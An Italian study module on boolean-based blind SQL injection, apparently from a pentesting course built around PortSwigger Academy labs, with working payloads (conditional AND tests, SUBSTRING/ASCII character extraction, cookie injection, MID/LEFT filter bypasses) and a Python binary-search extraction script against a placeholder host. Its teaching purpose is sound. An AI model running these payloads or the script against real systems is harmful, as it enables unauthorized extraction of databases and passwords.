# Blind SQLi (Boolean-Based)

**Difficolta:** Advanced
**Time to Master:** 2.5h
**Prerequisiti:** [03-Union-Based-SQLi.md](03-Union-Based-SQLi.md)
**Lab:** PortSwigger Academy — Blind SQLi

---

## Obiettivo

Estrarre dati quando l'applicazione non mostra ne errori ne output diretto della query, ma il comportamento della pagina cambia (contenuto diverso, presenza/assenza di un elemento) in base alla veridicita di una condizione booleana iniettata.

---

## Concetti chiave

### Principio

```sql
' AND 1=1 --   -> risposta "normale" (condizione vera)
' AND 1=2 --   -> risposta diversa (condizione falsa, es. pagina vuota o messaggio "not found")
```

Una volta identificato un differenziale osservabile, puoi porre domande booleane sul contenuto del DB carattere per carattere.

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| Burp Intruder | payload su condizione booleana | true/false per ogni tentativo | automatizza estrazione char-by-char |
| sqlmap | `--technique=B` | automatizza tutto | preferito su target reali |

---

## Payload / Esempi

### Esempio 1: conferma blind boolean

```sql
' AND 1=1 --   -- pagina normale
' AND 1=2 --   -- pagina diversa (contenuto mancante, redirect, messaggio errore generico)
```

### Esempio 2: estrarre il nome del database carattere per carattere

```sql
' AND SUBSTRING(database(),1,1)='a' --
' AND SUBSTRING(database(),1,1)='b' --
' AND ASCII(SUBSTRING(database(),1,1))>109 --   -- ricerca binaria, molto piu veloce
```

**Spiegazione:** invece di provare ogni carattere in sequenza (lento), usa ricerca binaria sul valore ASCII: dimezzi il numero di richieste necessarie ad ogni step.

### Esempio 3: script Python per automatizzare l'estrazione (ricerca binaria)

```python
import requests

url = "http://target.com/product?id=1"
result = ""
for pos in range(1, 20):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        payload = f"1' AND ASCII(SUBSTRING(database(),{pos},1))>{mid} --"
        r = requests.get(url, params={"id": payload})
        if "Welcome" in r.text:   # condizione "vera" osservata nell'app
            low = mid + 1
        else:
            high = mid
    if low == 32:
        break
    result += chr(low)
    print(result)
```

**Spiegazione:** questo script e la base di quello che sqlmap fa automaticamente; capirlo a fondo aiuta enormemente a interpretare e customizzare sqlmap quando serve un tamper particolare.

### Esempio 4: blind boolean su cookie

```
Cookie: TrackingId=abc123' AND '1'='1
Cookie: TrackingId=abc123' AND '1'='2
```

---

## Evasion / Bypass Techniques

Se `SUBSTRING` e filtrato, usa alternative equivalenti:

```sql
' AND MID(database(),1,1)='a' --
' AND LEFT(database(),1)='a' --
```

---

## Lab Hands-On

### Lab 1: PortSwigger — Blind SQL injection with conditional responses
**Obiettivo:** estrarre password admin carattere per carattere
**Difficulty:** Difficile
**Time:** 1h

**Walkthrough breve:**
1. Trova il differenziale booleano (contenuto diverso tra vero/falso)
2. Costruisci payload SUBSTRING/ASCII
3. Automatizza con Burp Intruder (cluster bomb su posizione+carattere) o script Python

---

## Common Mistakes

- Usare ricerca lineare invece che binaria -> molto piu lenta su stringhe lunghe (password hash)
- Non verificare bene qual e il "differenziale" esatto tra vero/falso -> a volte e sottile (un singolo elemento HTML in piu/meno)

---

## Link Utili

- [PortSwigger — Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind)

---

## Connessioni

- **Prerequisito:** [03-Union-Based-SQLi.md](03-Union-Based-SQLi.md)
- **Prossimo Step:** [05-Time-Based-Blind.md](05-Time-Based-Blind.md)

---

## Checklist di padronanza

- [ ] So identificare il differenziale booleano vero/falso
- [ ] So costruire estrazione carattere per carattere con SUBSTRING/ASCII
- [ ] So implementare ricerca binaria per velocizzare l'estrazione
- [ ] So automatizzare con Burp Intruder

---

## Note personali

_(spazio libero)_
